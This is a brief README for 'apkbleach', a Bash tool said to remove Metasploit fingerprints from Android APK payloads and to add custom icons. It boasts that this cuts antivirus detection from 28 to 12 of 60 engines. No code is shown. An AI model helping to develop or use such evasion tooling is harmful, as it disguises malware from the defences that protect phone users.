# apkbleach
This BASH script will remove the obvious fingerprints of metasploit through out a given apk file. It also gives the option to inject a custom app icon. This script is constantly being improved so revisions will be made frequently. This is the PUBLIC version of this script thats only triggers 12 of 60 anti-viruses. When the metasploit payload generated by msfvenom with out this script triggers 28 of 60. I am always looking for feed back and ways to improve the code and its techniques.
